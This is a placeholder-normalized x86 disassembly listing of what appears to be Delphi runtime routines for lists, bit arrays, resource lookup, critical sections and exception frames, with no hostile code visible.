call sub_4198bc
retn
sub_419cf0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419d37
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41973c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d3e
mov eax [ rw-data ]
call sub_4198bc
retn
sub_419d44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_419508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d99
mov eax [ rw-data ]
call sub_4198bc
retn
sub_419df8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403558
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_419e30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419df8
mov edx eax
mov eax [ rw-data ]
call sub_41a7a4
pop edi
pop esi
pop ebx
retn
sub_419e5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a82c
mov esi eax
xor edx edx
push ebp
push sub_419ec6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
mov edx ebx
mov eax esi
call sub_41a468
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419ed8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408110
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419f18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40405c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_419f5c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41a4c4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41a30c
sub_419fb4
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a468
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_419ff4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_419fb4
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41a018
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044c8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cd3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a08c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41c83c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41a09c
push ebx
call sub_406168
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406168
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41a30c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
call sub_406168
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
call sub_406168
mov [ eax + 0xc ] ebx
sub_41a0f4
push ebx
push esi
push edi
call sub_406168
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a468
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41a124
push ebx
push esi
call sub_406168
mov eax [ eax + 0x8 ]
call sub_403234
call sub_406168
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41a550
mov esi eax
call sub_406168
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41a358
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406168
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403234
sub_41a180
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41a216
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a21d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031c0
call sub_41a180
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405418
call sub_405468
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41a018
or bl al
sub_41a228
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41a2d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41a2b7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40317c
call sub_41a180
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41a09c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2be
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41a0f4
retn
call sub_41a124
sub_41a2ec
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41a30c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a358
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402998
mov edx esi
mov eax ebx
call sub_41a468
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a3bc
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a3b8
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
jmp sub_4039c0
sub_41a3f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a43c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405efc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a3bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a443
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41a468
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_41a490
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41a624
retn
sub_41a4c4
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41a4e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402998
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a55c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_41a468
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_41a358
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41a4e4
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_41a5b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a604
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a4c4
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a358
sub_41a624
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027dc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41a660
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a3f4
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41a624
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c40
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41a358
dec ebp
inc edi
jne r-xdata
sub_41a6d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a728
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035c0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a82c
xor eax eax
push ebp
push sub_41a78a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403234
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a791
mov eax [ ebp - 0x4 ]
call sub_41a890
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41a7a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a82c
xor eax eax
push ebp
push sub_41a820
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a30c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a4c4
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a827
mov eax [ ebp - 0x4 ]
call sub_41a890
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41a3f4
sub_41a840
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a82c
xor eax eax
push ebp
push sub_41a883
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a604
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a88a
mov eax [ ebp - 0x4 ]
call sub_41a890
retn
sub_41a89c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a8f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41a8f0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41a8cc
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_40279c
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c40
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4027bc
mov edx edi
mov eax ebp
call sub_41a8e4
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402998
sub_41a994
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41a8cc
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41a8f0
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41a9c0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41aa38
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_41d4dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41aa78
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ab2e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403184
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab35
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41ab54
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41abe9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403184
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40426c
mov eax ebx
mov si 0xffff
call sub_403430
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abf0
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov si 0xffff
call sub_403430
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403430
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404388
sub_41abfb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403488
mov eax ebx
mov si 0xffff
call sub_403430
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403430
push eax
lea eax [ ebx + 0x4 ]
call sub_405a38
mov ecx eax
mov edx r-xdata
pop eax
call sub_4032e8
sub_41ac58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41ac98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41acc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405a38
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403430
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
call sub_405a38
mov edx eax
mov eax esi
call sub_41acc0
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405a38
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_41ad58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41adad
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405a38
mov edx eax
mov eax edi
call sub_41acc0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41adb4
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41adbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41adf4
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41ae24
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41ae60
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403184
mov edx esp
mov eax esi
call sub_40426c
add esp 0x100
pop esi
pop ebx
retn
sub_41ae88
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41af1d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403184
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40426c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403430
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_41ae48
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40905c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af24
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_41af40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_41b0a0
mov edx ebx
mov eax esi
call sub_41b038
sub_41af70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41ae48
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_41a55c
mov dl 0x1
mov eax ebx
call sub_41ae24
sub_41afa0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41afd0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
